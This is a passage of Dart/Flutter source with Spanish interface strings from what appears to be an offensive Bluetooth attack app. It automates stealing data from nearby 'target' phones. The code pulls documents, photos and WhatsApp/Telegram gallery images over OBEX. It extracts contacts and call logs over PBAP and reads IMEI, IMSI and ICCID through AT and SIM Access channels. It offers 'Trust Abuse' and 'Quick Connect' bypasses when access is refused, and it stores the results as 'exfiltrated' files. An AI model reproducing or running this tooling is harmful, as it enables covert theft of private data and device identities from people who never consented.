        return 'El objetivo no está emparejado o rechaza la conexión. Esto es NORMAL con objetivos no emparejados: la extracción OBEX/PBAP/SPP lo requiere. Si lo deseas, activa "Bonding automático" en el menú ⋮ y vuelve a ejecutar (el diálogo aparecerá EN SU PANTALLA).';
      }
      if (r.contains('root')) {
        return 'Ataque reservado a dispositivos rooteados. Rootea el móvil atacante o ignora estos ataques.';
      }
      if (r.contains('timeout')) {
        return 'El objetivo no respondió a tiempo: probablemente no expone ese servicio o está fuera de rango.';
      }
      if (r.contains('permission') || r.contains('permiso') || r.contains('security exception')) {
        return 'Falta un permiso en el móvil atacante (BLUETOOTH_CONNECT / BLUETOOTH_SCAN en Android 12+). Concédelos al abrir la app.';
      }
      if (r.contains('unknown attack type')) {
        return 'Tipo de ataque sin handler nativo registrado — no se ejecutará.';
      }
      return 'Sin pista específica: revisa el log completo en la pestaña RADAR.';
    }

    return Column(
      children: [
        for (final d in _attackDiagnostics.take(50))
          Container(
            margin: const EdgeInsets.only(bottom: 8),
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: Colors.redAccent.withValues(alpha: 0.08),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: Colors.redAccent.withValues(alpha: 0.3)),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    const Icon(Icons.error_outline, size: 14, color: Colors.redAccent),
                    const SizedBox(width: 6),
                    Expanded(
                      child: Text(
                        '❌ ${d['label']}  (${d['type']})',
                        style: const TextStyle(fontSize: 12, fontWeight: FontWeight.bold),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Text('Motivo: ${d['reason']}', style: TextStyle(fontSize: 11, color: Colors.grey[300])),
                const SizedBox(height: 4),
                Text('💡 ${hintFor(d['reason'] ?? '')}', style: const TextStyle(fontSize: 11, color: Colors.amberAccent)),
              ],
            ),
          ),
        if (_collectedData.isEmpty)
          Padding(
            padding: const EdgeInsets.only(top: 4),
            child: Text(
              '⚠️ Ningún ataque tuvo éxito todavía. Un objetivo moderno (Android 6+/iOS) exige ACEPTAR el emparejamiento/transmisión EN SU PANTALLA: eso no es evadible por software. Empareja primero el objetivo, acepta los diálogos, y prioriza objetivos legacy/IoT para extracción.',
              style: TextStyle(fontSize: 11, color: Colors.orange[300], fontStyle: FontStyle.italic),
            ),
          ),
      ],
    );
  }

  Widget _buildDataPanel() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.green[900]!.withValues(alpha: 0.2),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.greenAccent.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.folder_open, color: Colors.greenAccent, size: 16),
              const SizedBox(width: 8),
              Text('DATOS RECOLECTADOS: ${_collectedData.length}', style: const TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
            ],
          ),
          const SizedBox(height: 8),
          ..._collectedData.take(20).map((d) => Padding(
            padding: const EdgeInsets.only(bottom: 2),
            child: Text(d, style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace')),
          )),
        ],
      ),
    );
  }

  Widget _buildObexCard(String title, String subtitle, Color color, VoidCallback? onTap) {
    return Card(
      child: ListTile(
        leading: Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: color.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(12)), child: Icon(Icons.cloud_download, color: color, size: 24)),
        title: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis),
        subtitle: Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10)),
        trailing: onTap != null ? Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: color.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(100), border: Border.all(color: color.withValues(alpha: 0.5))), child: Icon(Icons.bolt, color: color, size: 16)) : null,
        onTap: onTap,
      ),
    );
  }

  Future<void> _obexScan() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('📂 OBEX Scan → $displayName');
    _appendLog('⏳ Conectando vía OBEX FTP...');

    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'file_exfil',
        command: 'scan',
      );

      if (result['success'] == true) {
        final files = result['files'] as List? ?? [];
        final rawFiles = files.map<Map<String, dynamic>>((f) => Map<String, dynamic>.from(f as Map)).toList();

        if (mounted) {
          setState(() {
            _obexFiles = rawFiles;
            _collectedData.add('📂 [$displayName] ${rawFiles.length} archivos encontrados via OBEX FTP');
          });
          _appendLog('✅ OBEX: ${rawFiles.length} archivos encontrados');
          
          // Auto-download important files AND photos from subdirectories
          final importantFiles = rawFiles.where((f) {
            final name = (f['name']?.toString() ?? '').toLowerCase();
            return name.endsWith('.vcf') || name.endsWith('.txt') || name.endsWith('.csv') || 
                   name.endsWith('.json') || name.endsWith('.xml') || name.endsWith('.log');
          }).toList();
          
          // Also scan common photo directories: DCIM/Camera, Pictures, Screenshots
          final photoDirs = ['DCIM/Camera', 'DCIM', 'Pictures', 'Screenshots'];
          final photoFiles = <Map<String, dynamic>>[];
          
          for (final dir in photoDirs) {
            try {
              final dirResult = await _exploitService.executeAttack(
                deviceAddress: _selectedDevice!['address'],
                type: 'file_exfil_dir',
                command: dir,
              );
              if (dirResult['success'] == true) {
                final dirFiles = (dirResult['files'] as List? ?? [])
                    .map<Map<String, dynamic>>((f) => {
                      ...Map<String, dynamic>.from(f as Map),
                      'path': '$dir/${f['name']}', // Store full path for download
                    })
                    .toList();
                
                // Filter to photos/videos only
                final photos = dirFiles.where((f) {
                  final name = (f['name']?.toString() ?? '').toLowerCase();
                  return name.endsWith('.jpg') || name.endsWith('.jpeg') || name.endsWith('.png') || 
                         name.endsWith('.mp4') || name.endsWith('.gif') || name.endsWith('.webp') ||
                         name.endsWith('.bmp') || name.endsWith('.heic');
                }).toList();
                
                photoFiles.addAll(photos);
                _appendLog('  📁 $dir: ${photos.length} fotos/videos encontrados');
              }
            } catch (e) {
              _appendLog('  ❌ $dir: no accesible');
            }
          }
          
          if (photoFiles.isNotEmpty) {
            _appendLog('📸 ${photoFiles.length} fotos/videos encontrados en subdirectorios');
          }
          
          final allDownloadable = [...importantFiles, ...photoFiles];
          
          if (importantFiles.isNotEmpty) {
            _appendLog('📥 Descargando ${importantFiles.length} archivos importantes automáticamente...');
            int downloaded = 0;
            for (final file in importantFiles) {
              final fileName = file['name']?.toString() ?? '';
              if (fileName.isEmpty) continue;
              
              try {
                final dlResult = await _exploitService.downloadFile(
                  _selectedDevice!['address'],
                  fileName,
                );
                if (dlResult['success'] == true) {
                  downloaded++;
                  final size = dlResult['size'] ?? 0;
                  _appendLog('  ✅ $fileName ($size bytes)');
                  _collectedData.add('📥 [$displayName] Descargado: $fileName ($size bytes)');
                }
              } catch (e) {
                _appendLog('  ❌ $fileName: $e');
              }
            }
            
            if (downloaded > 0) {
              _appendLog('✅ OBEX: $downloaded/${importantFiles.length} archivos descargados a /sdcard/Download/');
              _collectedData.add('📥 [$displayName] $downloaded archivos descargados a Descargas');
            }
          }
          
          // Download photos from subdirectories
          if (photoFiles.isNotEmpty) {
            _appendLog('📸 Descargando ${photoFiles.length} fotos/videos...');
            int photosDownloaded = 0;
            for (final photo in photoFiles) {
              final photoPath = photo['path']?.toString() ?? photo['name']?.toString() ?? '';
              if (photoPath.isEmpty) continue;
              
              try {
                final dlResult = await _exploitService.downloadFile(
                  _selectedDevice!['address'],
                  photoPath,
                );
                if (dlResult['success'] == true) {
                  photosDownloaded++;
                  final size = dlResult['size'] ?? 0;
                  _appendLog('  📸 ${photo['name']} ($size bytes)');
                  _collectedData.add('📸 [$displayName] Foto descargada: ${photo['name']} ($size bytes)');
                }
              } catch (e) {
                _appendLog('  ❌ ${photo['name']}: $e');
              }
            }
            
            if (photosDownloaded > 0) {
              _appendLog('✅ Fotos: $photosDownloaded/${photoFiles.length} descargadas a /sdcard/Download/');
              _collectedData.add('📸 [$displayName] $photosDownloaded fotos descargadas a Descargas');
            }
          }
          
          _saveState(); // Persist OBEX file list and download results
          
          final totalDownloaded = (importantFiles.isNotEmpty ? importantFiles.length : 0) + (photoFiles.isNotEmpty ? photoFiles.length : 0);
          if (mounted) {
            ScaffoldMessenger.of(context).showSnackBar(
              SnackBar(
                content: Text('📂 ${rawFiles.length} archivos, ${totalDownloaded} descargados (docs+fotos)', style: const TextStyle(fontSize: 12)),
                backgroundColor: Colors.green[900],
                duration: const Duration(seconds: 5),
                behavior: SnackBarBehavior.floating,
              ),
            );
          }
        }
      } else {
        final msg = result['message']?.toString() ?? '';
        _appendLog('❌ OBEX fallido: $msg');
        
        // Si es fallo de auth, sugerir bypass
        if (msg.toLowerCase().contains('auth') || msg.toLowerCase().contains('denied') || msg.toLowerCase().contains('reject') || msg.toLowerCase().contains('fail')) {
          if (mounted) {
            ScaffoldMessenger.of(context).showSnackBar(
              SnackBar(
                content: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Text('🔒 Acceso denegado. Intentar bypass?', style: TextStyle(color: Colors.orangeAccent, fontWeight: FontWeight.bold, fontSize: 12)),
                    const SizedBox(height: 4),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                      children: [
                        TextButton.icon(
                          icon: const Icon(Icons.flash_on, size: 14),
                          label: const Text('Quick Connect', style: TextStyle(fontSize: 10)),
                          style: TextButton.styleFrom(foregroundColor: Colors.redAccent),
                          onPressed: () { if (mounted) { ScaffoldMessenger.of(context).hideCurrentSnackBar(); _bypassQuickConnect(); } },
                        ),
                        TextButton.icon(
                          icon: const Icon(Icons.lock_reset, size: 14),
                          label: const Text('Trust Abuse', style: TextStyle(fontSize: 10)),
                          style: TextButton.styleFrom(foregroundColor: Colors.orange),
                          onPressed: () { if (mounted) { ScaffoldMessenger.of(context).hideCurrentSnackBar(); _bypassOBEXTrust(); } },
                        ),
                      ],
                    ),
                  ],
                ),
                backgroundColor: Colors.orange[900],
                duration: const Duration(seconds: 6),
                behavior: SnackBarBehavior.floating,
              ),
            );
          }
        }
      }
    } catch (e) {
      _appendLog('💥 OBEX Error: $e');
    }
  }

  void _openFileBrowser() {
    if (_selectedDevice == null) return;
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => FileBrowserScreen(device: _selectedDevice!),
      ),
    );
  }

  // ========== SDP DISCOVERY ==========

  Future<void> _sdpDiscover() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('🔍 SDP Discover → $displayName');
    _appendLog('⏳ Descubriendo servicios sin pairing...');

    try {
      final result = await _exploitService.sdpDiscover(_selectedDevice!['address']);

      if (result['success'] == true) {
        final services = (result['services'] as List? ?? [])
            .map<Map<String, dynamic>>((s) => Map<String, dynamic>.from(s as Map))
            .toList();

         if (mounted) {
           setState(() {
             _sdpServices = services;
             _collectedData.add('🔍 [$displayName] ${services.length} servicios descubiertos via SDP');
           });
           _appendLog('✅ SDP: ${services.length} servicios encontrados');
           _saveState(); // Persist SDP results
           if (mounted) {
             ScaffoldMessenger.of(context).showSnackBar(
               SnackBar(
                 content: Text('🔍 ${services.length} servicios descubiertos en $displayName', style: const TextStyle(fontSize: 12)),
                 backgroundColor: Colors.cyan[900],
                 duration: const Duration(seconds: 3),
                 behavior: SnackBarBehavior.floating,
               ),
             );
           }
         }
      } else {
        _appendLog('❌ SDP fallido: ${result['message']}');
      }
    } catch (e) {
      _appendLog('💥 SDP Error: $e');
    }
  }

  // ========== EXTRACCIÓN DE IDENTIDAD (AT / SAP / IMEI) ==========

  Future<void> _extractAtIdentity() async {
    final device = _selectedDevice;
    if (device == null) return;
    final displayName = device_utils.getDeviceDisplayName(device);
    _appendLog('🆔 AT Identity Extract → $displayName');
    _appendLog('⏳ Probando canales RFCOMM (SPP/HFP)...');
    setState(() => _identityExtractionResult = null);
    try {
      final result = await RealExploitService.extractDeviceIdentity(device);
      setState(() => _identityExtractionResult = result);
      if (result['success'] == true) {
        final imei = result['imei'] ?? '';
        final imsi = result['imsi'] ?? '';
        final iccid = result['iccid'] ?? '';
        final msisdn = result['msisdn'] ?? '';
        final pbCount = result['phonebookCount'] ?? 0;
        final smsCount = result['smsCount'] ?? 0;
        _appendLog('✅ Canal AT en RFCOMM ${result['channel']}');
        if (imei.isNotEmpty) {
          final luhn = result['imeiLuhnValid'] == true ? ' (Luhn OK)' : ' (Luhn NO válido)';
          _appendLog('📱 IMEI: $imei$luhn');
          _collectedData.add('📱 [$displayName] IMEI: $imei');
        }
        if (imsi.isNotEmpty) {
          _appendLog('🪪 IMSI: $imsi');
          _collectedData.add('🪪 [$displayName] IMSI: $imsi');
        }
        if (iccid.isNotEmpty) {
          _appendLog('💳 ICCID: $iccid');
          _collectedData.add('💳 [$displayName] ICCID: $iccid');
        }
        if (msisdn.isNotEmpty) _appendLog('📞 MSISDN: $msisdn');
        _appendLog('📇 Agenda: $pbCount entradas, SMS: $smsCount');
        _saveState();
      } else {
        _appendLog('❌ ${result['note'] ?? result['error'] ?? 'Sin canal AT accesible'}');
      }
    } catch (e) {
      _appendLog('💥 AT Identity Error: $e');
    }
  }

  Future<void> _sapExtract() async {
    final device = _selectedDevice;
    if (device == null) return;
    final displayName = device_utils.getDeviceDisplayName(device);
    _appendLog('📟 SAP Extract (SIM Access Profile) → $displayName');
    _appendLog('⏳ Conectando vía SAP (requiere pairing y servidor SAP)...');
    setState(() => _identityExtractionResult = null);
    try {
      final result = await RealExploitService.sapExtract(device);
      setState(() => _identityExtractionResult = result);
      if (result['success'] == true) {
        final imsi = result['imsi'] ?? '';
        final iccid = result['iccid'] ?? '';
        final msisdn = result['msisdn'] ?? '';
        _appendLog('✅ SAP conectado (ATR: ${result['atr'] ?? 'N/A'})');
        if (imsi.isNotEmpty) {
          _appendLog('🪪 IMSI: $imsi');
          _collectedData.add('🪪 [$displayName] IMSI (SAP): $imsi');
        }
        if (iccid.isNotEmpty) {
          _appendLog('💳 ICCID: $iccid');
          _collectedData.add('💳 [$displayName] ICCID (SAP): $iccid');
        }
        if (msisdn.isNotEmpty) _appendLog('📞 MSISDN: $msisdn');
        _saveState();
      } else {
        _appendLog('❌ ${result['error'] ?? result['note'] ?? 'SAP no disponible'}');
      }
    } catch (e) {
      _appendLog('💥 SAP Error: $e');
    }
  }

  void _deriveImeiCandidates() {
    final device = _selectedDevice;
    if (device == null) return;
    final mac = device['address']?.toString() ?? '';
    final candidates = HeuristicAnalysisService().deriveImeiCandidates(mac);
    setState(() {
      _identityExtractionResult = {
        'success': candidates.isNotEmpty,
        'imeiCandidates': candidates,
        'source': 'Derivación heurística desde BD_ADDR (no verificado)',
      };
    });
    if (candidates.isEmpty) {
      _appendLog('🔢 No se pudieron derivar candidatos IMEI de $mac');
    } else {
      _appendLog('🔢 ${candidates.length} candidatos IMEI derivados de $mac (NO verificados)');
      for (final c in candidates.take(3)) {
        _appendLog('   - ${c['imei']} (TAC ${c['tac']})');
      }
    }
  }

  // ========== EXTRACCIÓN DE GALERÍA (FOTOS DEL OBJETIVO) ==========

  Future<void> _extractPhotos({int maxImages = 30}) async {
    final device = _selectedDevice;
    if (device == null) return;
    final displayName = device_utils.getDeviceDisplayName(device);
    _appendLog('📸 Gallery Extract → $displayName');
    _appendLog('⏳ Conectando vía OBEX FTP y recorriendo galería (DCIM/Pictures/WhatsApp/Telegram)...');
    setState(() => _extractedImages = []);
    try {
      final result = await RealExploitService.extractImages(device, maxImages: maxImages);
      final images = (result['images'] as List? ?? [])
          .map<Map<String, dynamic>>((e) => Map<String, dynamic>.from(e as Map))
          .toList();
      if (mounted) {
        setState(() => _extractedImages = images);
      }
      if (result['success'] == true && images.isNotEmpty) {
        final totalBytes = result['totalBytes'] ?? 0;
        _appendLog('✅ Galería: ${images.length} fotos extraídas ($totalBytes bytes)');
        for (final img in images.take(5)) {
          _appendLog('   🖼️ ${img['name']} (${img['size']} bytes) → ${img['localPath']}');
        }
        _collectedData.add('📸 [$displayName] ${images.length} fotos extraídas de la galería ($totalBytes bytes)');
        _saveState();
      } else {
        _appendLog('❌ ${result['note'] ?? result['error'] ?? 'Galería no accesible (requiere perfil OBEX FTP sin auth)'}');
      }
    } catch (e) {
      _appendLog('💥 Gallery Error: $e');
    }
  }

  Widget _buildGalleryPanel() {
    final images = _extractedImages;
    if (images.isEmpty) return const SizedBox.shrink();

    final totalBytes = images.fold<int>(0, (acc, img) => acc + ((img['size'] as num?)?.toInt() ?? 0));

    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.pink.withValues(alpha: 0.06),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.pinkAccent.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildInfoRow('FOTOS EXTRAÍDAS', '${images.length} (${totalBytes} bytes)', Colors.pinkAccent),
          const SizedBox(height: 8),
          SizedBox(
            height: 130,
            child: GridView.builder(
              scrollDirection: Axis.horizontal,
              itemCount: images.length,
              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                crossAxisCount: 1,
                mainAxisSpacing: 8,
                crossAxisSpacing: 8,
              ),
              itemBuilder: (context, index) {
                final img = images[index];
                final localPath = img['localPath']?.toString() ?? '';
                return Column(
                  children: [
                    Expanded(
                      child: localPath.isNotEmpty && File(localPath).existsSync()
                          ? ClipRRect(
                              borderRadius: BorderRadius.circular(8),
                              child: Image.file(File(localPath), fit: BoxFit.cover),
                            )
                          : Container(
                              decoration: BoxDecoration(
                                color: Colors.pink.withValues(alpha: 0.15),
                                borderRadius: BorderRadius.circular(8),
                              ),
                              child: const Icon(Icons.broken_image, color: Colors.white54),
                            ),
                    ),
                    const SizedBox(height: 4),
                    Text(
                      img['name']?.toString() ?? '?',
                      style: const TextStyle(color: Colors.white54, fontSize: 9),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ],
                );
              },
            ),
          ),
          const SizedBox(height: 8),
          Text(
            'Guardadas en: exfiltrated/images/ (almacenamiento interno)',
            style: const TextStyle(color: Colors.white38, fontSize: 10),
          ),
        ],
      ),
    );
  }

  Future<void> _mediastoreEnhancedExtract() async {
    final device = _selectedDevice;
    if (device == null) return;
    final displayName = device_utils.getDeviceDisplayName(device);
    _appendLog('📱 MediaStore Enhanced → $displayName');
    _appendLog('⏳ Consultando content:// URIs (Android 10+ scoped storage)...');
    setState(() => _mediastoreEnhanced = []);
    try {
      final result = await RealExploitService.mediastoreExtractAll(device, maxImages: 30);
      final images = (result['images'] as List? ?? [])
          .map<Map<String, dynamic>>((e) => Map<String, dynamic>.from(e as Map))
          .toList();
      if (mounted) setState(() => _mediastoreEnhanced = images);
      if (result['success'] == true && images.isNotEmpty) {
        final totalBytes = result['totalBytes'] ?? 0;
        _appendLog('✅ MediaStore Enhanced: ${images.length} imógenes ($totalBytes bytes)');
        _collectedData.add('📱 [$displayName] MediaStore Enhanced: ${images.length} imógenes ($totalBytes bytes)');
        _saveState();
      } else {
        _appendLog('❌ ${result['error'] ?? result['message'] ?? 'MediaStore no accesible'}');
      }
    } catch (e) {
      _appendLog('💥 MediaStore Error: $e');
    }
  }

  Future<void> _gattImageRead() async {
    final device = _selectedDevice;
    if (device == null) return;
    final displayName = device_utils.getDeviceDisplayName(device);
    _appendLog('📡 GATT Image Read → $displayName');
    _appendLog('⏳ Escaneando GATT characteristics buscando datos de imagen...');
    setState(() => _gattImages = []);
    try {
      final result = await RealExploitService.gattImageRead(device, maxImages: 15);
      final images = (result['images'] as List? ?? [])
          .map<Map<String, dynamic>>((e) => Map<String, dynamic>.from(e as Map))
          .toList();
      if (mounted) setState(() => _gattImages = images);
      if (result['success'] == true && images.isNotEmpty) {
        _appendLog('✅ GATT Image Read: ${images.length} imógenes encontradas');
        _collectedData.add('📡 [$displayName] GATT Image Read: ${images.length} imógenes');
        _saveState();
      } else {
        _appendLog('ℹ️ GATT: ${images.length} imógenes (escaneadas ${result['characteristicsScanned'] ?? 0} characteristics)');
      }
    } catch (e) {
      _appendLog('💥 GATT Image Read Error: $e');
    }
  }

  Future<void> _oppServerMode() async {
    final device = _selectedDevice;
    if (device == null) return;
    final displayName = device_utils.getDeviceDisplayName(device);
    _appendLog('📤 OPP Server Mode → $displayName');
    _appendLog('⏳ Esperando que el target envíe imágenes (30s timeout)...');
    setState(() => _oppReceivedImages = []);
    try {
      final result = await RealExploitService.oppServerMode(device, timeoutSec: 30, maxImages: 10);
      final images = (result['images'] as List? ?? [])
          .map<Map<String, dynamic>>((e) => Map<String, dynamic>.from(e as Map))
          .toList();
      if (mounted) setState(() => _oppReceivedImages = images);
      if (result['success'] == true && images.isNotEmpty) {
        _appendLog('✅ OPP Server: ${images.length} imógenes recibidas');
        _collectedData.add('📤 [$displayName] OPP Server: ${images.length} imógenes recibidas');
        _saveState();
      } else {
        _appendLog('ℹ️ OPP Server: sin imógenes (el target no conectó)');
      }
    } catch (e) {
      _appendLog('💥 OPP Server Error: $e');
    }
  }

  Future<void> _mapImageExtract() async {
    final device = _selectedDevice;
    if (device == null) return;
    final displayName = device_utils.getDeviceDisplayName(device);
    _appendLog('💬 MAP Image Extract → $displayName');
    _appendLog('⏳ Extrayendo imógenes adjuntas de mensajes...');
    setState(() => _mapImages = []);
    try {
      final result = await RealExploitService.mapImageExtract(device, maxMessages: 50, maxImages: 20);
      final images = (result['images'] as List? ?? [])
          .map<Map<String, dynamic>>((e) => Map<String, dynamic>.from(e as Map))
          .toList();
      if (mounted) setState(() => _mapImages = images);
      if (result['success'] == true && images.isNotEmpty) {
        _appendLog('✅ MAP Image Extract: ${images.length} imógenes encontradas');
        _collectedData.add('💬 [$displayName] MAP Image Extract: ${images.length} imógenes');
        _saveState();
      } else {
        _appendLog('ℹ️ MAP: ${result['message'] ?? 'sin imógenes adjuntas'}');
      }
    } catch (e) {
      _appendLog('💥 MAP Image Extract Error: $e');
    }
  }

  Widget _buildModernExtractionPanel(String method, List<Map<String, dynamic>> images, Color accentColor) {
    if (images.isEmpty) return const SizedBox.shrink();
    final totalBytes = images.fold<int>(0, (acc, img) => acc + ((img['size'] as num?)?.toInt() ?? 0));
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: accentColor.withValues(alpha: 0.06),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: accentColor.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildInfoRow('$method IMÁGENES', '${images.length} (${totalBytes} bytes)', accentColor),
          const SizedBox(height: 8),
          SizedBox(
            height: 100,
            child: GridView.builder(
              scrollDirection: Axis.horizontal,
              itemCount: images.length,
              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                crossAxisCount: 1,
                mainAxisSpacing: 6,
                crossAxisSpacing: 6,
              ),
              itemBuilder: (context, index) {
                final img = images[index];
                final localPath = img['localPath']?.toString() ?? '';
                return Column(
                  children: [
                    Expanded(
                      child: localPath.isNotEmpty && File(localPath).existsSync()
                          ? ClipRRect(
                              borderRadius: BorderRadius.circular(6),
                              child: Image.file(File(localPath), fit: BoxFit.cover),
                            )
                          : Container(
                              decoration: BoxDecoration(
                                color: accentColor.withValues(alpha: 0.15),
                                borderRadius: BorderRadius.circular(6),
                              ),
                              child: const Icon(Icons.image, color: Colors.white54, size: 24),
                            ),
                    ),
                    const SizedBox(height: 2),
                    Text(
                      img['name']?.toString() ?? '?',
                      style: TextStyle(color: Colors.white54, fontSize: 8),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ],
                );
              },
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildIdentityResultPanel() {
    final result = _identityExtractionResult;
    if (result == null) return const SizedBox.shrink();

    final imei = result['imei']?.toString() ?? '';
    final imsi = result['imsi']?.toString() ?? '';
    final iccid = result['iccid']?.toString() ?? '';
    final msisdn = result['msisdn']?.toString() ?? '';
    final manufacturer = result['manufacturer']?.toString() ?? '';
    final model = result['model']?.toString() ?? '';
    final pbCount = result['phonebookCount'] ?? 0;
    final smsCount = result['smsCount'] ?? 0;
    final candidates = result['imeiCandidates'];
    final luhnValid = result['imeiLuhnValid'] == true;

    List<Widget> rows = [
      _buildInfoRow('Estado', result['success'] == true ? 'ÉXITO' : 'FALLIDO',
          result['success'] == true ? Colors.greenAccent : Colors.redAccent),
      if (manufacturer.isNotEmpty) _buildInfoRow('Fabricante', manufacturer, Colors.white),
      if (model.isNotEmpty) _buildInfoRow('Modelo', model, Colors.white),
      if (imei.isNotEmpty)
        _buildInfoRow('IMEI', '$imei${luhnValid ? ' ✓' : ' (Luhn inválido)'}',
            luhnValid ? Colors.greenAccent : Colors.orangeAccent),
      if (imsi.isNotEmpty) _buildInfoRow('IMSI', imsi, Colors.lightBlueAccent),
      if (iccid.isNotEmpty) _buildInfoRow('ICCID', iccid, Colors.lightBlueAccent),
      if (msisdn.isNotEmpty) _buildInfoRow('MSISDN', msisdn, Colors.lightBlueAccent),
      if (pbCount is int && pbCount > 0) _buildInfoRow('Contactos', '$pbCount', Colors.white),
      if (smsCount is int && smsCount > 0) _buildInfoRow('SMS', '$smsCount', Colors.white),
    ];

    if (candidates is List && candidates.isNotEmpty) {
      rows.add(const Divider(color: Colors.white12));
      rows.add(_buildInfoRow('Candidatos IMEI (heurística)', '${candidates.length}', Colors.blueGrey));
      for (final c in candidates.take(5)) {
        rows.add(_buildInfoRow('   ${c['imei']}', 'TAC ${c['tac']} — no verificado', Colors.blueGrey.shade200));
      }
    }

    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.white.withValues(alpha: 0.05),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.tealAccent.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: rows,
      ),
    );
  }

  Widget _buildInfoRow(String label, String value, Color color) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Flexible(
            child: Text(label,
                style: const TextStyle(color: Colors.white54, fontSize: 12),
                overflow: TextOverflow.ellipsis,
                maxLines: 1),
          ),
          const SizedBox(width: 12),
          Flexible(
            child: Text(value,
                style: TextStyle(color: color, fontSize: 12, fontFamily: 'monospace'),
                textAlign: TextAlign.right,
                overflow: TextOverflow.ellipsis,
                maxLines: 1),
          ),
        ],
      ),
    );
  }

  // ========== PBAP EXTRACTION ==========

  Future<void> _pbapExtract(String extractType) async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('📇 PBAP Extract ($extractType) → $displayName');
    _appendLog('⏳ Conectando via PBAP profile...');

    try {
      final result = await _exploitService.pbapExtract(
        _selectedDevice!['address'],
        extractType: extractType,
      );

      if (result['success'] == true) {
        if (mounted) {
          setState(() {
            // Handle contacts
            if (result.containsKey('contacts')) {
              final contacts = (result['contacts'] as List? ?? [])
                  .map<Map<String, dynamic>>((c) => Map<String, dynamic>.from(c as Map))
                  .toList();
              _pbapContacts = contacts;
              _collectedData.add('📇 [$displayName] ${contacts.length} contactos extraidos via PBAP');
            }
            // Handle call history
            if (result.containsKey('calls')) {
              final calls = (result['calls'] as List? ?? [])
                  .map<Map<String, dynamic>>((c) => Map<String, dynamic>.from(c as Map))
                  .toList();
              _pbapCalls = calls;
              _collectedData.add('📞 [$displayName] ${calls.length} llamadas extraidas via PBAP');
            }
          });
          final contactCount = result['contactCount'] ?? result['count'] ?? 0;
          final callCount = result['callCount'] ?? 0;
          _appendLog('✅ PBAP: $contactCount contactos, $callCount llamadas extraidas');
          _saveState(); // Persist PBAP extraction results
          if (mounted) {
            ScaffoldMessenger.of(context).showSnackBar(
              SnackBar(
                content: Text('📇 $contactCount contactos, $callCount llamadas extraidas de $displayName', style: const TextStyle(fontSize: 12)),
                backgroundColor: Colors.orange[900],
                duration: const Duration(seconds: 3),
                behavior: SnackBarBehavior.floating,
              ),
            );
          }
        }
      } else {
        final msg = result['message']?.toString() ?? '';
        _appendLog('❌ PBAP fallido: $msg');
        
        // Si es fallo de auth, sugerir bypass
        if (msg.toLowerCase().contains('auth') || msg.toLowerCase().contains('denied') || msg.toLowerCase().contains('reject') || msg.toLowerCase().contains('fail') || msg.toLowerCase().contains('connection')) {
          if (mounted) {
            ScaffoldMessenger.of(context).showSnackBar(
              SnackBar(
                content: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Text('🔒 PBAP rechazado. Intentar bypass?', style: TextStyle(color: Colors.orangeAccent, fontWeight: FontWeight.bold, fontSize: 12)),
                    const SizedBox(height: 4),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                      children: [
                        TextButton.icon(
                          icon: const Icon(Icons.flash_on, size: 14),
                          label: const Text('Quick Connect', style: TextStyle(fontSize: 10)),
                          style: TextButton.styleFrom(foregroundColor: Colors.redAccent),
                          onPressed: () { if (mounted) { ScaffoldMessenger.of(context).hideCurrentSnackBar(); _bypassQuickConnect(); } },
                        ),
                        TextButton.icon(
                          icon: const Icon(Icons.lock_reset, size: 14),
                          label: const Text('Trust Abuse', style: TextStyle(fontSize: 10)),
                          style: TextButton.styleFrom(foregroundColor: Colors.orange),
                          onPressed: () { if (mounted) { ScaffoldMessenger.of(context).hideCurrentSnackBar(); _bypassOBEXTrust(); } },
                        ),
                      ],
                    ),
                  ],
                ),
